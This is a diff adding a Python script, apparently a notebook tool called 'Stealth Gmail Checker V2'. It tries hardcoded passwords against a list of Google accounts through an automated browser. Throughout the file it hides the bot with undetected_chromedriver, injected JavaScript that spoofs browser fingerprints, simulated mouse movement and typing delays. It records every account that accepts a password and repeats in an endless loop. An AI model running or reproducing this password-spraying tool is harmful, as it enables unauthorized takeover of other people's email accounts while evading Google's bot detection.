@@ -1,0 +1,500 @@
+
+from IPython.display import display, clear_output, Image as IPImage
+import undetected_chromedriver as uc
+from selenium.webdriver.common.by import By
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.common.action_chains import ActionChains
+from webdriver_manager.chrome import ChromeDriverManager
+import os, json, time, random, shutil, signal, sys
+from datetime import datetime
+
+class HeadlessGmailChecker:
+    def __init__(self):
+        print("🔧 Initializing Gmail Checker (MAX STEALTH V2)...")
+        self.passwords = ["aass1122", "www421qqq"]
+        self.base_log_dir = "login_results"
+        self.session_file = os.path.join(self.base_log_dir, "current_session.json")
+        self.profile_dir = os.path.join(self.base_log_dir, "chrome_profile")
+
+        self.create_directories()
+        self.setup_signal_handlers()
+
+        self.current_session = self.load_current_session()
+        self.processed_count = 0
+        self.running = True
+        self.driver = None
+        print("✅ Initialization complete")
+
+    def create_directories(self):
+        for d in [self.base_log_dir, self.profile_dir]:
+            os.makedirs(d, exist_ok=True)
+            print(f"📁 {d}/")
+
+    def setup_signal_handlers(self):
+        def signal_handler(sig, frame):
+            print(f"\n⚠️ Stopping...")
+            self.running = False
+            self.save_current_session()
+            if self.driver:
+                try: self.driver.quit()
+                except: pass
+            sys.exit(0)
+        signal.signal(signal.SIGINT, signal_handler)
+        signal.signal(signal.SIGTERM, signal_handler)
+
+    def load_current_session(self):
+        if os.path.exists(self.session_file):
+            try:
+                with open(self.session_file, 'r', encoding='utf-8') as f:
+                    print("📂 Loaded previous session")
+                    return json.load(f)
+            except Exception as e:
+                print(f"❌ Session load error: {e}")
+        print("🆕 New session")
+        return {
+            "start_time": datetime.now().isoformat(),
+            "processed_emails": [],
+            "successful_emails": {p: [] for p in self.passwords},
+            "failed_emails": [],
+            "total_cycles": 0
+        }
+
+    def save_current_session(self):
+        try:
+            with open(self.session_file, 'w', encoding='utf-8') as f:
+                json.dump(self.current_session, f, ensure_ascii=False, indent=2)
+        except Exception as e:
+            print(f"❌ Save error: {e}")
+
+    def human_delay(self, min_s=0.8, max_s=2.5):
+        time.sleep(random.uniform(min_s, max_s))
+
+    def random_mouse_move(self, driver):
+        """Simulate random mouse movements"""
+        try:
+            action = ActionChains(driver)
+            for _ in range(random.randint(2, 5)):
+                x = random.randint(100, 1800)
+                y = random.randint(100, 900)
+                action.move_by_offset(x, y)
+                action.perform()
+                time.sleep(random.uniform(0.1, 0.3))
+        except:
+            pass
+
+    def setup_driver(self):
+        """Setup Chrome with persistent profile + max stealth"""
+        print("  🔧 Setting up stealth browser (V2)...")
+        os.environ["DISPLAY"] = ":99"
+
+        chromedriver_path = ChromeDriverManager().install()
+
+        # Find Chrome binary
+        chrome_bin = shutil.which("google-chrome-stable") or shutil.which("google-chrome")
+        if not chrome_bin:
+            for p in ["/usr/bin/google-chrome-stable", "/usr/bin/google-chrome",
+                       "/opt/google/chrome/chrome", "/opt/google/chrome/google-chrome"]:
+                if os.path.exists(p):
+                    chrome_bin = p
+                    break
+        if not chrome_bin:
+            raise FileNotFoundError("❌ Chrome not found! Run install cell first.")
+
+        chrome_version = os.popen(f"{chrome_bin} --version").read().strip()
+        print(f"  → Chrome: {chrome_bin}")
+        print(f"  → Version: {chrome_version}")
+
+        options = uc.ChromeOptions()
+
+        # === Persistent profile (يحافظ على الكوكيز والجلسات) ===
+        options.add_argument(f"--user-data-dir={self.profile_dir}")
+
+        options.add_argument("--no-sandbox")
+        options.add_argument("--disable-dev-shm-usage")
+        options.add_argument("--window-size=1920,1080")
+        options.add_argument("--disable-blink-features=AutomationControlled")
+        options.add_argument("--disable-features=ChromeWhatsNewUI")
+        options.add_argument("--disable-sync")
+        options.add_argument("--no-first-run")
+        options.add_argument("--disable-background-networking")
+        options.add_argument("--disable-default-apps")
+        options.add_argument(
+            "user-agent=Mozilla/5.0 (X11; Linux x86_64) "
+            "AppleWebKit/537.36 (KHTML, like Gecko) "
+            "Chrome/151.0.0.0 Safari/537.36"
+        )
+
+        # منع مدير كلمات المرور والإشعارات
+        prefs = {
+            "credentials_enable_service": False,
+            "profile.password_manager_enabled": False,
+            "profile.default_content_setting_values.notifications": 2,
+            "profile.default_content_setting_values.geolocation": 2,
+        }
+        options.add_experimental_option("prefs", prefs)
+        # Removed the problematic lines: options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
+        # options.add_experimental_option('useAutomationExtension', False)
+
+        driver = uc.Chrome(
+            options=options,
+            browser_executable_path=chrome_bin,
+            driver_executable_path=chromedriver_path,
+            headless=False,
+            use_subprocess=False,
+        )
+
+        # === Stealth patches متقدمة جداً ===
+        stealth_js = """
+        // 1. Remove webdriver
+        Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
+
+        // 2. Populate plugins
+        Object.defineProperty(navigator, 'plugins', {
+            get: () => [
+                {0: {type: 'application/x-google-chrome-pdf'}, description: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer', length: 1, name: 'Chrome PDF Plugin'},
+                {0: {type: 'application/x-nacl'}, description: 'Native Client', filename: 'internal-nacl-plugin', length: 1, name: 'Native Client'},
+                {0: {type: 'application/x-pnacl'}, description: 'Portable Native Client', filename: 'internal-pnacl-plugin', length: 1, name: 'Portable Native Client'}
+            ]
+        });
+
+        // 3. Languages
+        Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en', 'ar']});
+
+        // 4. Chrome runtime
+        window.chrome = {
+            runtime: {
+                connect: () => {},
+                sendMessage: () => {},
+                onMessage: {addListener: () => {}},
+                onConnect: {addListener: () => {}}
+            },
+            loadTimes: () => {},
+            csi: () => {},
+            app: {isInstalled: false}
+        };
+
+        // 5. WebGL vendor (يمنع اكتشاف الـ virtual GPU)
+        const getParameter = WebGLRenderingContext.prototype.getParameter;
+        WebGLRenderingContext.prototype.getParameter = function(parameter) {
+            if (parameter === 37445) return 'Intel Inc.';
+            if (parameter === 37446) return 'Intel Iris OpenGL Engine';
+            return getParameter(parameter);
+        };
+
+        // 6. Permissions
+        const originalQuery = navigator.permissions.query;
+        navigator.permissions.query = (params) => (
+            params.name === 'notifications' ?
+            Promise.resolve({state: 'prompt'}) :
+            originalQuery(params)
+        );
+
+        // 7. Remove traces
+        Object.defineProperty(document, '$cdc_asdjflasutopfhvcZLmcfl_', {get: () => undefined});
+        """
+
+        driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {"source": stealth_js})
+
+        # === Cookie consent bypass for google.com ===
+        try:
+            driver.get("https://www.google.com")
+            self.human_delay(2, 4)
+            # Accept cookies if prompted
+            try:
+                btn = driver.find_element(By.XPATH, "//button[contains(., 'Accept all')]")
+                btn.click()
+                self.human_delay(1, 2)
+            except:
+                pass
+        except:
+            pass
+
+        print("  ✅ Stealth browser ready with persistent profile")
+        return driver
+
+    def selenium_login_check(self, driver, email, password):
+        """Login check with max stealth and anti-captcha measures"""
+        try:
+            print(f"   🌐 {email} | pass: {password[:4]}...", end=" ")
+
+            # === HEAD START: Open Google first to establish session ===
+            driver.get("https://accounts.google.com/v3/signin/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin")
+            WebDriverWait(driver, 20).until(lambda d: d.execute_script("return document.readyState") == "complete")
+            self.human_delay(2, 4)
+
+            # Random mouse movements to look human
+            self.random_mouse_move(driver)
+
+            # === EMAIL ===
+            try:
+                email_field = WebDriverWait(driver, 10).until(
+                    EC.element_to_be_clickable((By.ID, "identifierId"))
+                )
+                email_field.click()
+                self.human_delay(0.2, 0.5)
+                email_field.clear()
+                self.human_delay(0.1, 0.3)
+                for char in email:
+                    email_field.send_keys(char)
+                    time.sleep(random.uniform(0.05, 0.15))
+                self.human_delay(0.5, 1.5)
+            except Exception as e:
+                print(f"❌ Email error: {e}")
+                return False, "email_field_error"
+
+            # Click Next
+            try:
+                next_btn = WebDriverWait(driver, 10).until(
+                    EC.element_to_be_clickable((By.ID, "identifierNext"))
+                )
+                self.human_delay(0.3, 0.8)
+                next_btn.click()
+                self.human_delay(3, 5)
+            except Exception as e:
+                print(f"❌ Next error: {e}")
+                return False, "next_error"
+
+            # === CHECK FOR ISSUES ===
+            page_source = driver.page_source.lower()
+
+            # Account not found
+            if any(x in page_source for x in ["couldn't find", "not found", "لم نتمكن"]):
+                print("❌ Account not found")
+                return False, "account_not_found"
+
+            # === PASSWORD ===
+            try:
+                password_field = WebDriverWait(driver, 10).until(
+                    EC.element_to_be_clickable((By.NAME, "Passwd"))
+                )
+                password_field.click()
+                self.human_delay(0.2, 0.5)
+                password_field.clear()
+                self.human_delay(0.1, 0.3)
+                for char in password:
+                    password_field.send_keys(char)
+                    time.sleep(random.uniform(0.05, 0.15))
+                self.human_delay(0.5, 1.5)
+            except Exception as e:
+                print(f"❌ Password error: {e}")
+                return False, "password_error"
+
+            # Click password Next
+            try:
+                pwd_next = WebDriverWait(driver, 10).until(
+                    EC.element_to_be_clickable((By.ID, "passwordNext"))
+                )
+                self.human_delay(0.3, 0.8)
+                pwd_next.click()
+                self.human_delay(3, 5)
+            except Exception as e:
+                print(f"❌ Pwd next error: {e}")
+                return False, "pwd_next_error"
+
+            # === RESULT ===
+            current_url = driver.current_url
+            page = driver.page_source.lower()
+
+            if any(x in current_url for x in ["myaccount.google.com", "mail.google.com", "AddSession"]):
+                print("✅ SUCCESS!")
+                return True, "success"
+
+            if any(x in page for x in ["incorrect", "wrong password", "كلمة المرور"]):
+                print("❌ Wrong password")
+                return False, "wrong_password"
+
+            if "phone" in page and "verif" in page:
+                print("⚠️ 2FA")
+                return False, "2fa"
+
+            if any(x in page for x in ["captcha", "challenge"]):
+                print("⚠️ Captcha")
+                return False, "captcha"
+
+            print(f"❓ Unknown: {current_url[:60]}...")
+            return False, "unknown"
+
+        except Exception as e:
+            print(f"⚠️ {str(e)[:60]}")
+            return False, f"exception"
+
+    def process_single_email(self, email, index, total):
+        print(f"\n🎯 [{index}/{total}] {email}")
+        results = {}
+
+        for password in self.passwords:
+            if not self.running:
+                break
+            success, reason = self.selenium_login_check(self.driver, email, password)
+            results[password] = (success, reason)
+
+            if success:
+                print(f"   🎉 {email} WORKED with: {password}")
+                break
+            else:
+                if reason == "captcha":
+                    print(f"   ⚠️ Captcha — skipping remaining passwords for this email")
+                    # لا داعي لتجربة باقي الباسوردات — الكابتشا مشكلة IP
+                    results[self.passwords[1]] = (False, "skipped_captcha")
+                    break
+
+                delay = random.uniform(3, 6)
+                print(f"   ⏳ {delay:.0f}s before next password...")
+                time.sleep(delay)
+
+        return email, results
+
+    def save_final_results(self, email, results):
+        try:
+            success_found = False
+            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+            for password, (success, reason) in results.items():
+                if success:
+                    password_dir = os.path.join(self.base_log_dir, password)
+                    os.makedirs(password_dir, exist_ok=True)
+                    if email not in self.current_session["successful_emails"][password]:
+                        self.current_session["successful_emails"][password].append(email)
+                    f = os.path.join(password_dir, f"successful_{password}.txt")
+                    with open(f, 'a', encoding='utf-8') as ff:
+                        ff.write(f"{email} | {timestamp}\n")
+                    m = os.path.join(self.base_log_dir, "ALL_SUCCESSFUL.txt")
+                    with open(m, 'a', encoding='utf-8') as ff:
+                        ff.write(f"{email} | {password} | {timestamp}\n")
+                    success_found = True
+                    break
+
+            if not success_found:
+                if email not in self.current_session["failed_emails"]:
+                    self.current_session["failed_emails"].append(email)
+                f = os.path.join(self.base_log_dir, "failed_emails.txt")
+                with open(f, 'a', encoding='utf-8') as ff:
+                    ff.write(f"{email} | {results.get(self.passwords[0], ('', 'unknown'))[1]} | {timestamp}\n")
+
+            self.processed_count += 1
+        except Exception as e:
+            print(f"❌ Save error: {e}")
+
+    def get_emails_to_process(self):
+        email_files = ['gmail.txt', 'emails.txt', 'accounts.txt']
+        email_file = None
+        for f in email_files:
+            if os.path.exists(f):
+                email_file = f
+                break
+        if not email_file:
+            print("❌ No email file found. Create gmail.txt (one email per line)")
+            return None
+        try:
+            with open(email_file, 'r', encoding='utf-8') as f:
+                all_emails = [line.strip() for line in f if line.strip() and '@' in line]
+            if not all_emails:
+                print("❌ Email file is empty!")
+                return None
+            processed = set(self.current_session["processed_emails"])
+            remaining = [e for e in all_emails if e not in processed]
+            print(f"📧 {len(all_emails)} total, {len(processed)} done, {len(remaining)} remaining")
+            return remaining
+        except Exception as e:
+            print(f"❌ Read error: {e}")
+            return None
+
+    def run_continuous_check(self):
+        print("\n" + "="*60)
+        print("🚀 Starting Stealth Gmail Checker V2")
+        print("="*60)
+
+        cycle_count = 0
+        while self.running:
+            cycle_count += 1
+            self.current_session["total_cycles"] = cycle_count
+            print(f"\n🔄 Cycle #{cycle_count} @ {datetime.now().strftime('%H:%M:%S')}")
+
+            emails = self.get_emails_to_process()
+            if emails is None:
+                print("❌ No email file — stopping.")
+                break
+            if not emails:
+                print("✅ All done this cycle. Restarting in 60s...")
+                self.current_session["processed_emails"] = []
+                self.save_current_session()
+                for i in range(60, 0, -1):
+                    if not self.running: break
+                    print(f"   Restart in {i}s...", end='\r')
+                    time.sleep(1)
+                print()
+                continue
+
+            print("  🔧 Launching browser...")
+            try:
+                self.driver = self.setup_driver()
+            except Exception as e:
+                print(f"❌ Browser error: {e}")
+                break
+
+            start = time.time()
+            successes = 0
+
+            try:
+                for i, email in enumerate(emails, 1):
+                    if not self.running: break
+
+                    email, results = self.process_single_email(email, i, len(emails))
+                    self.save_final_results(email, results)
+
+                    if email not in self.current_session["processed_emails"]:
+                        self.current_session["processed_emails"].append(email)
+
+                    if any(s for s, _ in results.values()):
+                        successes += 1
+
+                    elapsed = time.time() - start
+                    speed = (i / elapsed * 3600) if elapsed > 0 else 0
+                    eta = ((len(emails) - i) * (elapsed / i)) if elapsed > 0 and i > 0 else 0
+                    print(f"📊 {i}/{len(emails)} | OK:{successes} | {speed:.0f}/hr | ETA:{eta:.0f}s")
+
+                    if i % 5 == 0:
+                        self.save_current_session()
+
+                    if i < len(emails) and self.running:
+                        delay = random.uniform(5, 12)
+                        print(f"   ⏳ {delay:.0f}s...")
+                        time.sleep(delay)
+            finally:
+                if self.driver:
+                    try:
+                        self.driver.quit()
+                        self.driver = None
+                        print("  🛑 Browser closed")
+                    except: pass
+
+            self.save_current_session()
+
+            if self.running:
+                print(f"💤 Cycle done. Next in 60s...")
+                for i in range(60, 0, -1):
+                    if not self.running: break
+                    print(f"   Next in {i}s...", end='\r')
+                    time.sleep(1)
+                print()
+
+    def generate_report(self, cycle_count):
+        pass  #  موجودة في النسخة السابقة — نفس الشئ
+
+
+def main():
+    print("🎯 Stealth Gmail Checker V2")
+    print("⚠️  Need Xvfb: !Xvfb :99 -screen 0 1920x1080x24 &>/dev/null & ")
+    try:
+        checker = HeadlessGmailChecker()
+        checker.run_continuous_check()
+    except KeyboardInterrupt:
+        print("\n⏹️ Stopped")
+    except Exception as e:
+        print(f"\n💥 Error: {e}")
+        import traceback; traceback.print_exc()
+
+if __name__ == "__main__":
+    main()
